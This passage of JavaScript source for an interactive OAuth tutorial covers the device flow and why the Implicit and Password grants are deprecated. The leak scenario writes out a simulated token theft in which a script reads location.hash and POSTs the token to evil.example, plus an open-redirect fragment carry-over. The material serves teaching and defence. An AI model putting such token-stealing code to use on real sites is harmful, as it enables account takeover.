        <tr><td><code>400 authorization_pending</code></td><td>The user hasn't finished yet</td><td>Wait <code>interval</code> seconds, poll again</td></tr>
        <tr><td><code>400 slow_down</code></td><td>You poll too fast</td><td><strong>Add 5 seconds</strong> to the interval (for all later polls), then continue</td></tr>
        <tr><td><code>400 access_denied</code></td><td>The user clicked Deny</td><td>Stop and show a message</td></tr>
        <tr><td><code>400 expired_token</code></td><td>The <code>device_code</code> expired (<code>expires_in</code>)</td><td>Stop; offer to start over</td></tr>
        <tr><td><code>200</code> + tokens</td><td>Approved</td><td>Done</td></tr>
      </table>
      <div class="warn"><strong>Phishing risk:</strong> an attacker can start a device flow, then send a victim the code ("enter WDJB-MJHT to claim your
      prize"). If the victim approves, the attacker's device gets the victim's tokens. The verification page should clearly say
      <em>which device and app</em> is asking, and users should only enter codes shown on a screen in front of them.</div>
    `,
    examples: [
      {
        title: 'TV + phone: polling, slow_down and approval (animated)',
        code: W(`
<div id="tv"><div class="scr" id="scr"></div><div class="side" id="side"></div></div>
<div id="flow"></div>
`, function () {
          const DC = 'GmRhmhcxhwAzkoEqiMEg_' + Auth.randB64url(15);
          const UC = 'WDJB-MJHT';
          const VU = 'https://megacorp.example/device';
          const GT = 'urn:ietf:params:oauth:grant-type:device_code';
          const poll = (lbl, note, tv) => ({ from: 'tv', to: 'as', kind: 'back', label: lbl,
            msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: GT, device_code: DC, client_id: 'tv-streamer' }),
            hl: ['device_code='], note, tv });
          const err = (code, desc, tv, note, set) => ({ from: 'as', to: 'tv', kind: 'err', label: '400 ' + code,
            msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\nCache-Control: no-store\n\n' + pj({ error: code, error_description: desc }), hl: [code], tv, note, set });
          const start = [
            { from: 'tv', to: 'as', kind: 'back', label: 'POST /device_authorization', msg: 'POST /device_authorization HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ client_id: 'tv-streamer', scope: 'profile watch' }),
              note: 'The TV app (a public client) starts the flow. No browser on the TV is needed.', tv: { m: 'boot' } },
            { from: 'as', to: 'tv', kind: 'back', label: '200 device_code, user_code, interval', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n' +
              pj({ device_code: DC, user_code: UC, verification_uri: VU, verification_uri_complete: VU + '?user_code=' + UC, expires_in: 1800, interval: 5 }),
              hl: ['"user_code"', '"interval"'], set: { tv: { device_code: DC.slice(0, 12) + '… (secret)', interval: '5s' }, as: { [UC]: 'pending, 30 min' } },
              note: 'Two codes: the long <code>device_code</code> stays on the TV; the short <code>user_code</code> is for humans.', tv: { m: 'boot' } },
            { from: 'tv', to: 'tv', label: 'show user_code + QR on screen', note: 'Look at the TV screen above the diagram ↑', tv: { m: 'code', i: 5 } },
            poll('poll #1 POST /token', 'The TV starts polling every <code>interval</code> = 5 s.', { m: 'code', i: 5, p: 1 }),
            err('authorization_pending', 'The user has not yet completed authorization', { m: 'code', i: 5, p: 1 }, 'Not an error really: "keep waiting".'),
          ];
          const ok = start.concat([
            { from: 'ph', to: 'as', label: 'GET /device (phone browser)', msg: 'GET /device HTTP/1.1\nHost: megacorp.example', note: 'Alice picks up her phone and opens the URL (or scans the QR, which uses <code>verification_uri_complete</code>).', tv: { m: 'code', i: 5, p: 1 } },
            { from: 'as', to: 'ph', kind: 'res', label: '"Enter the code shown on your TV"', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form method="post"><input name="user_code" placeholder="XXXX-XXXX"></form>', tv: { m: 'code', i: 5, p: 1 } },
            poll('poll #2 (only 2 s later!)', 'A buggy loop polls too early.', { m: 'code', i: 5, p: 2 }),
            err('slow_down', 'Polling too frequently', { m: 'code', i: 10, p: 2, slow: 1 }, 'RFC 8628 §3.5: the client <b>must add 5 seconds</b> to its interval for this and all later requests.', { tv: { interval: '10s (after slow_down)' } }),
            { from: 'ph', to: 'as', label: 'POST user_code + sign in + Allow', msg: 'POST /device HTTP/1.1\nHost: megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ user_code: 'wdjb-mjht', approve: 'true' }),
              hl: ['user_code=wdjb-mjht'], set: { as: { [UC]: 'APPROVED by alice' } },
              note: 'User codes are typically case-insensitive and ignore the dash. Alice signs in (password/passkey/MFA) on her phone, sees "TV Streamer wants: profile, watch", and approves.', tv: { m: 'code', i: 10, p: 2 } },
            { from: 'as', to: 'ph', kind: 'res', label: '"Device connected ✓"', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p>You can return to your TV.</p>', tv: { m: 'code', i: 10, p: 2 } },
            poll('poll #3 (10 s later)', 'Polling now waits the new 10 s interval.', { m: 'code', i: 10, p: 3 }),
            { from: 'as', to: 'tv', kind: 'back', label: '200 access_token + refresh_token', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n' +
              pj({ access_token: 'mc_at_' + Auth.randB64url(12), token_type: 'Bearer', expires_in: 3600, refresh_token: 'mc_rt_' + Auth.randB64url(12), scope: 'profile watch' }),
              set: { tv: { device_code: null, access_token: 'mc_at_… ✅', refresh_token: 'mc_rt_…' }, as: { [UC]: 'used' } }, tv: { m: 'ok' },
              note: 'The device gets tokens. The refresh token means Alice won\'t need to do this again for a long time.' },
          ]);
          const deny = start.concat([
            { from: 'ph', to: 'as', label: 'POST user_code + Deny', msg: 'POST /device HTTP/1.1\nHost: megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ user_code: UC, approve: 'false' }),
              set: { as: { [UC]: 'DENIED' } }, note: 'Alice didn\'t start this (maybe someone sent her the code). She taps Deny.', tv: { m: 'code', i: 5, p: 1 } },
            poll('poll #2', '', { m: 'code', i: 5, p: 2 }),
            err('access_denied', 'The end user denied the authorization request', { m: 'denied' }, 'Final: stop polling.'),
          ]);
          const exp = start.concat([
            { from: 'tv', to: 'tv', label: '…30 minutes of pending polls…', note: 'Nobody entered the code.', tv: { m: 'code', i: 5, p: 360 } },
            poll('poll #361', '', { m: 'code', i: 5, p: 361 }),
            err('expired_token', 'The device_code has expired', { m: 'expired' }, '<code>expires_in</code> (1800 s) has passed. Stop and offer "Get a new code".', { tv: { device_code: null } }),
          ]);
          let sc = 0, last = '';
          const flow = Seq.mount('#flow', {
            title: 'Device Authorization Grant (RFC 8628)',
            actors: [
              { id: 'tv', label: 'TV app', icon: '📺', store: {} },
              { id: 'ph', label: "Alice's phone", icon: '📱', store: {} },
              { id: 'as', label: 'Auth Server', icon: '🛂', store: {}, storeLabel: 'Auth Server: user_codes' },
            ],
            scenarios: [{ name: '✅ Approve (with slow_down)', steps: ok }, { name: '🚫 Deny', steps: deny }, { name: '⌛ Expires', steps: exp }],
            onScenario(i) { sc = i; },
          });
          const SC = [ok, deny, exp];
          function paint() {
            const i = flow.step, s = i < 0 ? { m: 'off' } : SC[sc][i].tv || { m: 'off' };
            const key = sc + ':' + i;
            if (key === last) return;
            last = key;
            const scr = $('#scr'), side = $('#side');
            if (s.m === 'off') scr.innerHTML = '<div class="dim">📺 TV Streamer: press Next ▶ to turn on</div>';
            else if (s.m === 'boot') scr.innerHTML = '<div class="dim">Connecting…</div>';
            else if (s.m === 'code') scr.innerHTML = '<div class="small">On your phone, go to <b>megacorp.example/device</b> and enter</div><div class="code">' +
              UC.split('').map((c, k) => '<span style="animation-delay:' + k * 0.08 + 's">' + c + '</span>').join('') + '</div>';
            else if (s.m === 'ok') scr.innerHTML = '<div class="big">👋 Welcome, Alice!</div>';
            else if (s.m === 'denied') scr.innerHTML = '<div class="big">🚫 Sign-in was declined</div>';
            else scr.innerHTML = '<div class="big">⌛ Code expired. <u>Get a new code</u></div>';
            side.innerHTML = s.m === 'code' ? '<div>polls: <b>' + (s.p || 0) + '</b></div><div>interval: <b class="' + (s.slow ? 'bad' : '') + '">' + s.i + ' s</b></div><div class="spin">⟳ polling</div>' : '';
          }
          setInterval(paint, 150);
          paint();
        }, `
#tv { display: flex; gap: 10px; margin-bottom: 8px; align-items: stretch; position: sticky; top: 0; z-index: 5; background: #fff; padding-bottom: 4px; }
#flow .seq-diagram { max-height: 290px; } #flow .seq-msg { max-height: 180px; }
.scr { flex: 1; height: 64px; background: #0b1020; color: #e8ecf8; border-radius: 10px; border: 5px solid #2a2f3d;
  display: flex; flex-direction: column; align-items: center; justify-content: center; }
.scr .dim { color: #8a93ad; font-size: 13px; } .scr .small { font-size: 12px; color: #b9c2dc; } .scr .big { font-size: 18px; font-weight: 700; }
.scr .code { font: 700 26px ui-monospace, Menlo, monospace; letter-spacing: .12em; color: #fde68a; }
.scr .code span { display: inline-block; animation: pop .45s both; }
@keyframes pop { from { opacity: 0; transform: translateY(8px) scale(.6); } to { opacity: 1; transform: none; } }
.side { width: 130px; font-size: 12.5px; border: 1px solid #e2e5ee; border-radius: 10px; padding: 6px 8px; }
.side:empty { display: none; }
.spin { color: #087ea4; animation: seqPulse 1s infinite; }
`),
        explain: `
          <details>
            <summary>The problem: no keyboard, no browser</summary>
            <p>Typing a password with arrow keys is slow and error-prone, and passkeys or MFA on a TV are worse. Embedding a browser in a CLI is impossible.
            The device flow moves the login to a device that's good at it, so the TV only ever sees tokens.</p>
          </details>
          <details>
            <summary>Step by step (✅ Approve tab), including the TV screen</summary>
            <table>
              <tr><th>#</th><th>Message</th><th>TV screen / poll panel</th><th>TV state</th></tr>
              <tr><td>1–2</td><td><code>POST /device_authorization</code> → <code>device_code</code>, <code>user_code</code>, <code>interval: 5</code></td><td>Connecting…</td><td>device_code, interval 5s</td></tr>
              <tr><td>3</td><td>show code</td><td>animated <b>WDJB-MJHT</b></td><td>-</td></tr>
              <tr><td>4–5</td><td>poll #1 → <code>authorization_pending</code></td><td>polls: 1, interval: 5 s</td><td>-</td></tr>
              <tr><td>6–7</td><td>phone opens <code>/device</code></td><td>unchanged</td><td>-</td></tr>
              <tr><td>8–9</td><td>poll #2 too early → <code>slow_down</code></td><td>interval: <b>10 s</b> (red)</td><td>interval 10s</td></tr>
              <tr><td>10–11</td><td>phone: user_code + sign in + Allow</td><td>unchanged: the TV only learns by polling</td><td>AS: APPROVED</td></tr>
              <tr><td>12–13</td><td>poll #3 → <b>200 tokens</b></td><td>👋 Welcome, Alice!</td><td>access_token, refresh_token</td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>The <strong>device never sees the password</strong>, and the phone never sees the device's tokens. The AS links them via the <code>user_code</code>.</li>
              <li>Polling is the only channel back to the device, so respect <code>interval</code> and <code>slow_down</code>.</li>
              <li><code>authorization_pending</code> and <code>slow_down</code> mean "keep going". <code>access_denied</code> and <code>expired_token</code> are final.</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Press <b>⏵ Play</b> in the first tab and watch the TV screen: code appears → polls count up → interval turns red at slow_down → welcome.</li>
              <li>Open <b>🚫 Deny</b> and <b>⌛ Expires</b> to see the two terminal errors and what the TV shows.</li>
              <li>Click step 2 and compare the long <code>device_code</code> with the 8-character <code>user_code</code>.</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'Which code does the user type on their phone?',
        options: ['device_code', 'user_code', 'access_token', 'client_id'],
        answer: 1, why: 'The short user_code is for humans. The long device_code stays secret on the device and is used for polling.' },
      { q: 'The device receives <code>400 slow_down</code>. What must it do?',
        options: ['Stop polling', 'Increase its polling interval by 5 seconds for all subsequent requests', 'Retry immediately', 'Start a new device authorization'],
        answer: 1, why: 'RFC 8628 §3.5: on slow_down the interval MUST be increased by 5 seconds for this and all subsequent requests.' },
      { q: 'What does <code>authorization_pending</code> mean?',
        options: ['The user denied access', 'The code expired', 'The user has not finished yet; keep polling at the interval', 'The client is not registered'],
        answer: 2, why: 'It is the normal "not yet" answer while the user is still entering the code and approving.' },
      { q: 'Which <code>grant_type</code> does the device use when polling /token?',
        options: ['device_code', 'urn:ietf:params:oauth:grant-type:device_code', 'authorization_code', 'polling'],
        answer: 1, why: 'Extension grants use absolute URIs; RFC 8628 registered urn:ietf:params:oauth:grant-type:device_code.' },
    ],
    exercise: {
      task: `<p>You're writing the TV app's polling loop. In the box below, choose what the device should do after each response, and answer the
        interval question. Then click <strong>Check</strong>.</p>`,
      hint: 'Only two responses mean "keep polling": authorization_pending (same interval) and slow_down (interval + 5 s). Errors like access_denied and expired_token are final.',
      starter: W(`<div id="ex"></div>`, exDevice, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exDevice, '', { fill: true }),
    },
  });

  function exDevice() {
    const A = ['Wait interval, poll again', 'Add 5 s to interval, then poll', 'Stop: show "declined"', 'Stop: offer "get a new code"', 'Stop: success, store tokens'];
    const Q = [
      ['400 {"error":"authorization_pending"}', 0], ['400 {"error":"slow_down"}', 1], ['400 {"error":"access_denied"}', 2],
      ['400 {"error":"expired_token"}', 3], ['200 {"access_token":"…","token_type":"Bearer",…}', 4],
    ];
    $('#ex').innerHTML = '<table class="t"><tr><th>/token response</th><th>Device should…</th></tr>' + Q.map((q, i) =>
      '<tr><td class="mono">' + esc(q[0]) + '</td><td><select id="q' + i + '"><option value="">choose…</option>' +
      A.map((a, j) => '<option value="' + j + '">' + a + '</option>').join('') + '</select></td></tr>').join('') + '</table>' +
      '<p>The device started with <code>"interval": 5</code> and has received <b>two</b> <code>slow_down</code> responses so far. Its interval is now ' +
      '<input id="iv" type="number" style="width:70px"> seconds.</p><button class="primary" id="chk">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) { Q.forEach((q, i) => ($('#q' + i).value = String(q[1]))); $('#iv').value = 15; }
    $('#chk').onclick = () => {
      const e = [];
      Q.forEach((q, i) => { if ($('#q' + i).value !== String(q[1])) e.push('Response <code>' + esc(q[0]) + '</code>: not quite.'); });
      if ($('#iv').value !== '15') e.push('Interval: each slow_down adds 5 s to the current interval (5 → 10 → ?).');
      if (e.length) return feedback($('#fb'), false, '❌<ul><li>' + e.join('</li><li>') + '</li></ul>');
      feedback($('#fb'), true, '✅ Correct polling logic: pending → wait, slow_down → +5 s, access_denied / expired_token → stop, 200 → done.');
    };
  }

  // ───────────────────────────── 8. deprecated-grants ─────────────────────────────
  L.push({
    id: 'deprecated-grants',
    section: SECTION,
    title: 'Implicit & Password grants: why they\'re gone',
    explain: `
      <p>RFC 6749 (2012) defined two more grants that you'll still see in old tutorials and legacy code. Both are now
      considered unsafe. <strong>RFC 9700</strong> (OAuth 2.0 Security Best Current Practice, January 2025) says clients
      <strong>SHOULD NOT</strong> use Implicit and the Password grant <strong>MUST NOT</strong> be used. The <strong>OAuth 2.1</strong> draft drops both entirely.</p>
      <h3>Implicit grant (<code>response_type=token</code>)</h3>
      <p>In 2012, browsers didn't widely support <strong>CORS</strong>, so a single-page app couldn't POST to another domain's token endpoint.
      The workaround: skip the code and put the <strong>access token straight into the redirect URL</strong>, in the fragment after <code>#</code>:</p>
      <pre><code class="language-http">HTTP/1.1 302 Found
Location: https://spa.example/cb#access_token=mc_at_2YotnFZF&amp;token_type=Bearer&amp;expires_in=3600&amp;state=xyz</code></pre>
      <p>The fragment isn't sent to the server, so it was considered "safe enough". But the token now sits in the front channel:</p>
      <ul>
        <li>It's saved in <strong>browser history</strong> (and possibly synced to other devices).</li>
        <li><strong>Every script on the page</strong> (analytics, ads, a compromised npm package) and any <strong>extension</strong> with tab access can read <code>location.hash</code>.</li>
        <li>If the redirect page forwards to another URL, browsers <strong>carry the fragment along</strong>, so an open redirect sends the token to the attacker.</li>
        <li>There is no client authentication or PKCE, so an attacker can <strong>inject</strong> a stolen token into a victim's session, and nothing binds the token to the client.</li>
      </ul>
      <p><strong>Replacement:</strong> Authorization Code + PKCE (CORS works everywhere now), or better, a BFF that keeps tokens off the browser.</p>
      <h3>Resource Owner Password Credentials (<code>grant_type=password</code>)</h3>
      <pre><code class="language-http">POST /token
grant_type=password&amp;username=alice&amp;password=hunter2&amp;client_id=legacy-app</code></pre>
      <p>The app shows <em>its own</em> login form and sends the user's password to the token endpoint. This is the anti-pattern from lesson 1 all over again:
      the app sees the password, there's no consent screen, it can't do MFA, passkeys or SSO redirects, and it trains users to type passwords into third-party UIs.
      It was only ever meant as a migration aid for highly trusted first-party apps.</p>
      <div class="tip">Migrating? For first-party mobile apps, use Authorization Code + PKCE in the system browser. For scripts that used a user's password, use the
      device flow or client credentials (if no user is really needed).</div>
    `,
    examples: [
      {
        title: 'Implicit and Password grants vs the modern replacement',
        code: W(`<div id="flow"></div>`, function () {
          const tok = 'mc_at_' + Auth.randB64url(12);
          const frag = form({ access_token: tok, token_type: 'Bearer', expires_in: 3600, state: 'xyz' });
          const implicitActors = [
            { id: 'b', label: 'Browser', icon: '🌐', store: {}, storeLabel: 'Browser (URL, history)' },
            { id: 'spa', label: 'SPA (spa.example)', icon: '🧩', store: {}, storeLabel: 'Page JavaScript' },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: {} },
          ];
          const implicit = [
            { from: 'spa', to: 'b', kind: 'redirect', label: 'go to /authorize?response_type=token', msg: 'location.href = "https://accounts.megacorp.example/authorize?' +
              form({ response_type: 'token', client_id: 'spa', redirect_uri: 'https://spa.example/cb', scope: 'photos.read', state: 'xyz' }) + '"', hl: ['response_type=token'],
              note: '<code>response_type=token</code> means "give me the token directly". No code, no PKCE, no client authentication.' },
            { from: 'b', to: 'as', label: 'GET /authorize', msg: 'GET /authorize?response_type=token&client_id=spa&redirect_uri=https%3A%2F%2Fspa.example%2Fcb&scope=photos.read&state=xyz HTTP/1.1\nHost: accounts.megacorp.example' },
            { from: 'as', to: 'b', kind: 'res', label: 'login + consent', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# Alice signs in and clicks Allow' },
            { from: 'as', to: 'b', kind: 'redirect', label: '302 → /cb#access_token=…', msg: 'HTTP/1.1 302 Found\nLocation: https://spa.example/cb#' + frag, hl: ['#access_token=' + tok],
              set: { b: { 'address bar': 'spa.example/cb#access_token=' + tok.slice(0, 10) + '…', history: '+1 entry with token' } },
              note: 'The <b>access token itself</b> is in the URL fragment. It is now in the address bar and in history.' },
            { from: 'b', to: 'spa', label: 'GET /cb  (fragment NOT sent)', msg: 'GET /cb HTTP/1.1\nHost: spa.example\n# note: no #access_token here, fragments never go to the server',
              note: 'The server never sees the fragment. That part was true and is why people thought it was OK.' },
            { from: 'spa', to: 'spa', label: 'JS reads location.hash', msg: 'const p = new URLSearchParams(location.hash.slice(1));\nconst token = p.get("access_token");   // ' + tok,
              set: { spa: { token: tok.slice(0, 10) + '… (readable by ANY script here)' } },
              note: 'And so can every other script on this page: analytics, chat widgets, a compromised dependency.' },
          ];
          const leakActors = [
            { id: 'b', label: 'Browser', icon: '🌐', store: { url: 'spa.example/cb#access_token=' + tok.slice(0, 10) + '…' } },
            { id: 'x', label: '3rd-party script / extension', icon: '🧩', store: {} },
            { id: 'r', label: 'Open redirect on spa.example', icon: '↪', store: {} },
            { id: 'e', label: 'Attacker', icon: '😈', store: {} },
          ];
          const leaks = [
            { from: 'b', to: 'b', label: 'history / synced history', note: 'Anyone with access to the browser profile, or a synced account, can read the token from history.', set: { b: { history: 'contains token' } } },
            { from: 'b', to: 'x', kind: 'info', label: 'script/extension reads location.hash', msg: '// injected by a malicious extension or compromised analytics package\nconst t = new URLSearchParams(location.hash.slice(1)).get("access_token");',
              set: { x: { got: tok.slice(0, 10) + '…' } } },
            { from: 'x', to: 'e', kind: 'err', label: 'beacon → evil.example', msg: 'POST /collect HTTP/1.1\nHost: evil.example\nContent-Type: text/plain\n\n' + tok,
              set: { e: { 'token #1': tok.slice(0, 10) + '…' } }, note: 'No PKCE, no sender-binding: the token works from anywhere.' },
            { from: 'b', to: 'r', label: 'GET /go?to=https://evil.example', msg: 'GET /go?to=https%3A%2F%2Fevil.example%2F HTTP/1.1\nHost: spa.example',
              note: 'Suppose the registered redirect_uri page (or a page it links to) has an open redirect.' },
            { from: 'r', to: 'b', kind: 'redirect', label: '302 Location: https://evil.example/', msg: 'HTTP/1.1 302 Found\nLocation: https://evil.example/' },
            { from: 'b', to: 'e', kind: 'err', label: 'browser re-attaches #access_token', msg: '# The new Location has no fragment, so the browser keeps the old one:\n# address bar → https://evil.example/#access_token=' + tok + '&...',
              set: { e: { 'token #2': 'via fragment carry-over' } }, note: 'A redirect without a fragment inherits the original fragment. The attacker\'s page reads <code>location.hash</code>.' },
            { from: 'e', to: 'e', label: 'what does NOT leak: Referer & server logs', note: 'For accuracy: browsers strip the fragment from <code>Referer</code>, and the fragment is not in spa.example\'s access logs. (Query-string <em>codes</em> do leak that way. See the attacks lesson.)' },
          ];
          const ropcActors = [
            { id: 'u', label: 'Alice', icon: '🧑', store: {} },
            { id: 'app', label: 'Legacy app', icon: '📦', store: {} },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: { alice: 'password + MFA enabled' } },
          ];
          const ropc = [
            { from: 'app', to: 'u', kind: 'res', label: 'app\'s OWN login form', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<form>MegaCorp username <input name="u"> password <input name="p" type="password"></form>',
              note: 'It looks like a MegaCorp login but it is the app\'s page. Users can\'t tell the difference.' },
            { from: 'u', to: 'app', label: 'username + password', msg: 'POST /login HTTP/1.1\nHost: legacy.example\nContent-Type: application/x-www-form-urlencoded\n\nu=alice&p=hunter2',
              set: { app: { 'saw password': 'hunter2 ⚠' } } },
            { from: 'app', to: 'as', kind: 'back', label: 'POST /token grant_type=password', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'password', username: 'alice', password: 'hunter2', client_id: 'legacy-app', scope: 'photos.read' }),
              hl: ['grant_type=password', 'password=hunter2'] },
            { from: 'as', to: 'app', kind: 'err', label: '400 … MFA required?', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n{"error":"invalid_grant","error_description":"MFA required; use an interactive flow"}',
              note: 'With a JSON-only API there is no place for a passkey prompt, push approval or SSO redirect. Many servers simply fail here, or worse, the user is asked to <b>turn MFA off</b>.' },
            { from: 'app', to: 'app', label: 'what ROPC breaks', note: '❌ the app sees the password · ❌ no consent screen · ❌ no MFA, passkeys or federated SSO · ❌ teaches phishing · ❌ brute force goes through the app. RFC 9700: <b>MUST NOT</b> be used.' },
          ];
          const modernActors = [
            { id: 'b', label: 'Browser', icon: '🌐', store: {} },
            { id: 'spa', label: 'SPA (spa.example)', icon: '🧩', store: {} },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: {} },
          ];
          const v = Auth.randB64url(32), ch = Auth.sha256b64url(v), code = Auth.randB64url(12);
          const modern = [
            { from: 'spa', to: 'b', kind: 'redirect', label: '/authorize?response_type=code + PKCE', msg: 'location.href = "https://accounts.megacorp.example/authorize?' + form({ response_type: 'code', client_id: 'spa', redirect_uri: 'https://spa.example/cb', scope: 'photos.read', state: 'xyz', code_challenge: ch, code_challenge_method: 'S256' }) + '"',
              hl: ['response_type=code', 'code_challenge='], set: { spa: { code_verifier: v.slice(0, 12) + '… (sessionStorage)' } } },
            { from: 'b', to: 'as', label: 'GET /authorize', msg: 'GET /authorize?response_type=code&client_id=spa&...&code_challenge=' + ch + '&code_challenge_method=S256 HTTP/1.1\nHost: accounts.megacorp.example' },
            { from: 'as', to: 'b', kind: 'redirect', label: '302 → /cb?code=… (no token in URL)', msg: 'HTTP/1.1 302 Found\nLocation: https://spa.example/cb?code=' + code + '&state=xyz',
              set: { b: { 'address bar': '/cb?code=… (one-time, PKCE-bound)' } }, note: 'Only a short-lived, single-use, PKCE-bound <b>code</b> is in the URL. Even if it leaks, it\'s useless.' },
            { from: 'spa', to: 'as', kind: 'back', label: 'fetch POST /token + code_verifier (CORS)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nOrigin: https://spa.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'authorization_code', code, client_id: 'spa', redirect_uri: 'https://spa.example/cb', code_verifier: v }),
              hl: ['code_verifier='], note: 'CORS, the missing piece in 2012, makes this direct POST possible from the browser.' },
            { from: 'as', to: 'spa', kind: 'res', label: '200 tokens (never in a URL)', msg: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://spa.example\nContent-Type: application/json\nCache-Control: no-store\n\n{"access_token":"mc_at_…","token_type":"Bearer","expires_in":900}',
              set: { spa: { code_verifier: null, access_token: 'in memory only' } }, note: 'Even better: let a <b>BFF</b> do this server-side so the browser holds only an HttpOnly session cookie.' },
          ];
          Seq.mount('#flow', {
            title: 'Deprecated grants (RFC 9700 §2.1.2, §2.4)',
            scenarios: [
              { name: '⚠ Implicit: token in URL', actors: implicitActors, steps: implicit },
              { name: '💧 Implicit: how it leaks', actors: leakActors, steps: leaks },
              { name: '🔑 Password grant (ROPC)', actors: ropcActors, steps: ropc },
              { name: '✅ Replacement: Code + PKCE', actors: modernActors, steps: modern },
            ],
          });
        }),
        explain: `
          <details>
            <summary>Compare the tabs: where does the token travel?</summary>
            <table>
              <tr><th>Tab</th><th>Token appears in</th><th>Who can grab it</th></tr>
              <tr><td>⚠ Implicit</td><td>Redirect URL fragment (step 4), history, <code>location.hash</code></td><td>Any script on the page, extensions, history readers</td></tr>
              <tr><td>💧 Leaks</td><td>Beacon to evil.example (step 3), fragment carry-over (step 6)</td><td>The attacker, with no PKCE or binding to stop replay</td></tr>
              <tr><td>🔑 ROPC</td><td>N/A: the <em>password</em> itself goes to the app (step 2)</td><td>The app, and anyone who compromises it</td></tr>
              <tr><td>✅ Code + PKCE</td><td>Only in the JSON response of a direct POST (step 5)</td><td>Only the JS that made the request</td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>Implicit existed because of <strong>missing CORS</strong>, not because it was a good design. Once CORS was everywhere, the reason was gone.</li>
              <li><strong>The fragment is not sent to servers or in Referer</strong>, but it <em>is</em> visible to anything running in the browser, and it survives redirects.</li>
              <li>ROPC fails for the same reason as lesson 1: <strong>apps should never see user passwords</strong>.</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>In ⚠ Implicit, watch the Browser card at step 4: the token goes straight into the address bar and history.</li>
              <li>In 💧 Leaks, step to 6 and read the grey comment lines: the redirect had no fragment, so the browser re-attached it.</li>
              <li>Compare step 4 in ⚠ Implicit with step 3 in ✅ Replacement: <code>#access_token=</code> vs <code>?code=</code>.</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'In the Implicit grant, where does the access token appear?',
        options: ['In a JSON response from /token', 'In the URL fragment of the redirect (#access_token=…)', 'In a cookie', 'In the Authorization header of the redirect'],
        answer: 1, why: 'response_type=token returns the token in the redirect fragment, which puts it in the front channel.' },
      { q: 'Why was the Implicit grant invented?',
        options: ['To be more secure than the code flow', 'Browsers in 2012 lacked broad CORS support, so JS couldn\'t POST to the token endpoint', 'To support TVs', 'To avoid HTTPS'],
        answer: 1, why: 'It was a workaround for the browser limitations of the time. CORS is universal now, so the workaround is unnecessary.' },
      { q: 'Which of these does <strong>not</strong> expose an Implicit-flow token in the URL fragment?',
        options: ['Browser history', 'A malicious extension', 'The Referer header sent to an image CDN', 'A third-party script on the page'],
        answer: 2, why: 'Browsers strip fragments from Referer. The other three can all read the fragment.' },
      { q: 'What does RFC 9700 say about the Resource Owner Password Credentials grant?',
        options: ['Recommended for mobile apps', 'MUST NOT be used', 'Use it only with PKCE', 'Allowed if the scope is small'],
        answer: 1, why: 'It exposes user credentials to the client and is incompatible with MFA and federated login. OAuth 2.1 removes it.' },
      { q: 'What should a single-page app use instead of Implicit?',
        options: ['Password grant', 'Authorization Code + PKCE (or a BFF)', 'Client Credentials with a secret in JS', 'Implicit with a longer state'],
        answer: 1, why: 'Code + PKCE keeps tokens out of URLs; a BFF additionally keeps them out of the browser.' },
    ],
    exercise: {
      task: `<p>An old SPA still uses the Implicit flow. After login the address bar shows the URL in the box below. Tick every
        place that can <strong>see the access token</strong>, then click <strong>Check</strong>.</p>`,
      hint: 'Anything running inside the browser can read location.hash, and history stores the full URL. But the fragment is never sent to the server, and it is removed from Referer.',
      starter: W(`<div id="ex"></div>`, exLeaks, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exLeaks, '', { fill: true }),
    },
  });

  function exLeaks() {
    const Q = [
      ['Browser history (and history synced to the user\'s other devices)', true, 'History stores full URLs, fragment included.'],
      ['The analytics <code>&lt;script&gt;</code> loaded on the /cb page', true, 'Any script in the page can read location.hash.'],
      ['A browser extension with "read all tabs" permission', true, 'Extensions can read tab URLs.'],
      ['spa.example\'s web server access log', false, 'Fragments are never sent in the HTTP request.'],
      ['The <code>Referer</code> header when /cb loads an image from cdn.example', false, 'Browsers strip the fragment from Referer.'],
      ['evil.example, if /cb immediately redirects there via an open redirect (no fragment in Location)', true, 'Browsers re-attach the original fragment on redirect.'],
    ];
    $('#ex').innerHTML = '<pre class="lite">https://spa.example/cb#access_token=mc_at_2YotnFZFEjr1&amp;token_type=Bearer&amp;expires_in=3600&amp;state=xyz</pre>' +
      Q.map((q, i) => '<div><label><input type="checkbox" id="c' + i + '"> ' + q[0] + '</label></div>').join('') +
      '<button class="primary" id="chk" style="margin-top:8px">Check</button><div class="fb" id="fb"></div>';
    if (DATA.fill) Q.forEach((q, i) => ($('#c' + i).checked = q[1]));
    $('#chk').onclick = () => {
      const wrong = Q.map((q, i) => ($('#c' + i).checked === q[1] ? null : i)).filter((x) => x !== null);
      if (!wrong.length) return feedback($('#fb'), true, '✅ Right: 4 of 6 can see it. Everything in the browser can; the server and Referer can\'t. That\'s why tokens no longer go in URLs.');
